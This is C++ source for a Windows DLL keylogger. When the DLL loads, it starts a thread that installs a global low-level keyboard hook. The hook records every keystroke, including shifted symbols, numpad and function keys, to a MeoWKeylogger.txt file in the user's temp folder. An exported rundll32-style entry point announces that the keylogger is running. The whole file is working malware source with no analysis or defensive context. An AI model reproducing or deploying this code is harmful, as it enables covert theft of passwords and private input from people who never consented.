
#define _CRT_SECURE_NO_WARNINGS
#include "MinHook.h"
#include <iostream>
#include <windows.h>
using namespace std;

HHOOK _hHook;
KBDLLHOOKSTRUCT kbData;
char dllPath[MAX_PATH];
char outputFilePath[MAX_PATH];
static DWORD lastKey = 0;
static DWORD lastTime = 0;

extern "C" __declspec(dllexport) void CALLBACK MeowStart(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    MessageBoxA(NULL, "Keylogger running... 按下確定停止", "Debug", MB_OK);
}

int save_key(DWORD vkCode) {
    DWORD currentTime = GetTickCount();
    if (vkCode == lastKey && (currentTime - lastTime) < 300) {
        return 0;
    }
    lastKey = vkCode;
    lastTime = currentTime;
    FILE* OUTPUT_FILE = NULL;
    if (fopen_s(&OUTPUT_FILE, outputFilePath, "a+") != 0 || OUTPUT_FILE == NULL) {
        return 0; 
    }

    bool isCaps = GetKeyState(VK_CAPITAL) & 0x0001; // 判斷 Caps Lock 狀態
    bool isShift = GetAsyncKeyState(VK_SHIFT) & 0x8000; // 判斷 Shift 鍵是否被按下
    char outputChar = ' ';
    if (vkCode >= 0x30 && vkCode <= 0x39) {// number
        outputChar = vkCode;
        if (isShift) {
            switch ((char)vkCode) {
            case '0': outputChar = ')'; break;
            case '1': outputChar = '!'; break;
            case '2': outputChar = '@'; break;
            case '3': outputChar = '#'; break;
            case '4': outputChar = '$'; break;
            case '5': outputChar = '%'; break;
            case '6': outputChar = '^'; break;
            case '7': outputChar = '&'; break;
            case '8': outputChar = '*'; break;
            case '9': outputChar = '('; break;
            }
        }
        fprintf(OUTPUT_FILE, "%c", outputChar);
    }
    else if (vkCode >= 0x41 && vkCode <= 0x5A) {
        outputChar = (char)vkCode;
        if (isCaps || isShift) {
            fprintf(OUTPUT_FILE, "%c", outputChar);
        }
        else {
            outputChar = (char)(vkCode + 32); // 小寫轉換
            fprintf(OUTPUT_FILE, "%c", outputChar);
        }

    }
    else if (vkCode >= 0x70 && vkCode <= 0x87) {// F1~F24
        int num = vkCode - 111;
        fprintf(OUTPUT_FILE, "F%d\n", num);
    }
    else if (vkCode >= 0xBB && vkCode <= 0xDE) { //Keyboard symbol
        switch (vkCode) {
        case 0xBB: outputChar = isShift ? '+' : '='; fprintf(OUTPUT_FILE, "%c", outputChar); break;
        case 0xBC: outputChar = isShift ? '<' : ','; fprintf(OUTPUT_FILE, "%c", outputChar); break;
        case 0xBD: outputChar = isShift ? '_' : '-'; fprintf(OUTPUT_FILE, "%c", outputChar); break;
        case 0xBE: outputChar = isShift ? '>' : '.'; fprintf(OUTPUT_FILE, "%c", outputChar); break;
        case 0xBF: outputChar = isShift ? '?' : '/'; fprintf(OUTPUT_FILE, "%c", outputChar); break;
        case 0xC0: outputChar = isShift ? '~' : '`'; fprintf(OUTPUT_FILE, "%c", outputChar); break;
        case 0xDB: outputChar = isShift ? '{' : '['; fprintf(OUTPUT_FILE, "%c", outputChar); break;
        case 0xDC: outputChar = isShift ? '|' : '\\'; fprintf(OUTPUT_FILE, "%c", outputChar); break;
        case 0xDD: outputChar = isShift ? '}' : ']'; fprintf(OUTPUT_FILE, "%c", outputChar); break;
        default: break;
        }
    }
    else if (vkCode >= 0x60 && vkCode <= 0x6F) {//Numpad
        if (!(isShift)) {
            switch (vkCode) {
            case VK_NUMPAD0: fprintf(OUTPUT_FILE, "0"); break;          // Numpad 0
            case VK_NUMPAD1: fprintf(OUTPUT_FILE, "1"); break;          // Numpad 1
            case VK_NUMPAD2: fprintf(OUTPUT_FILE, "2"); break;          // Numpad 2
            case VK_NUMPAD3: fprintf(OUTPUT_FILE, "3"); break;          // Numpad 3
            case VK_NUMPAD4: fprintf(OUTPUT_FILE, "4"); break;          // Numpad 4
            case VK_NUMPAD5: fprintf(OUTPUT_FILE, "5"); break;          // Numpad 5
            case VK_NUMPAD6: fprintf(OUTPUT_FILE, "6"); break;          // Numpad 6
            case VK_NUMPAD7: fprintf(OUTPUT_FILE, "7"); break;          // Numpad 7
            case VK_NUMPAD8: fprintf(OUTPUT_FILE, "8"); break;          // Numpad 8
            case VK_NUMPAD9: fprintf(OUTPUT_FILE, "9"); break;          // Numpad 9
            case VK_MULTIPLY: fprintf(OUTPUT_FILE, "*"); break;         // Numpad Multiply (*)
            case VK_ADD: fprintf(OUTPUT_FILE, "+"); break;              // Numpad Add (+)
            case VK_SUBTRACT: fprintf(OUTPUT_FILE, "-"); break;         // Numpad Subtract (-)
            case VK_DECIMAL: fprintf(OUTPUT_FILE, "."); break;          // Numpad Decimal (.)
            case VK_DIVIDE: fprintf(OUTPUT_FILE, "/"); break;           // Numpad Divide (/)
            default: break;
            }
        }
    }

    switch (vkCode) {// method keys
    case VK_BACK: fprintf(OUTPUT_FILE, "[Backspace]\n"); break;  // Backspace
    case VK_TAB: fprintf(OUTPUT_FILE, "[Tab]\n"); break;         // Tab
    case VK_RETURN: fprintf(OUTPUT_FILE, "[Enter]\n"); break;    // Enter
    // case VK_LSHIFT: fprintf(OUTPUT_FILE, "[LShift]\n"); break;   // LShift
    // case VK_RSHIFT: fprintf(OUTPUT_FILE, "[RShift]\n"); break;   // RShift
    case VK_LCONTROL: fprintf(OUTPUT_FILE, "[LCtrl]"); break;  // LCtrl
    case VK_RCONTROL: fprintf(OUTPUT_FILE, "[RCtrl]"); break;  // RCtrl
    case VK_LMENU: fprintf(OUTPUT_FILE, "[LAlt]\n"); break;      // LAlt
    case VK_RMENU: fprintf(OUTPUT_FILE, "[RAlt]\n"); break;      // RAlt
    case VK_LWIN: fprintf(OUTPUT_FILE, "[LWin]\n"); break;       // LWin
    case VK_RWIN: fprintf(OUTPUT_FILE, "[RWin]\n"); break;       // RWin
    case VK_CAPITAL: fprintf(OUTPUT_FILE, "[Caps Lock]\n"); break; // Caps Lock
    case VK_ESCAPE: fprintf(OUTPUT_FILE, "[Esc]\n"); break;      // Esc
    case VK_SPACE: fprintf(OUTPUT_FILE, "[Space]"); break;     // Space
    default: break;
    }
    fclose(OUTPUT_FILE);
    return 0;
}

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code >= 0) {
        if (wParam == WM_KEYDOWN) {
            kbData = *((KBDLLHOOKSTRUCT*)lParam);
            save_key(kbData.vkCode);
        }
    }
    return CallNextHookEx(_hHook, code, wParam, lParam);

}
int keylogger() {
    _hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (_hHook == NULL) {
        printf("Failed to set hook. Error code: %d\n", GetLastError());
        return FALSE; // 立即返回失敗
    }
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)){
    }
    return 0;
}
void SetupFilePath() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath); 
    snprintf(outputFilePath, sizeof(outputFilePath), "%sMeoWKeylogger.txt", tempPath);
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        SetupFilePath();
        HANDLE hereThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)keylogger, NULL, 0, NULL);
        CloseHandle(hereThread);
        
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
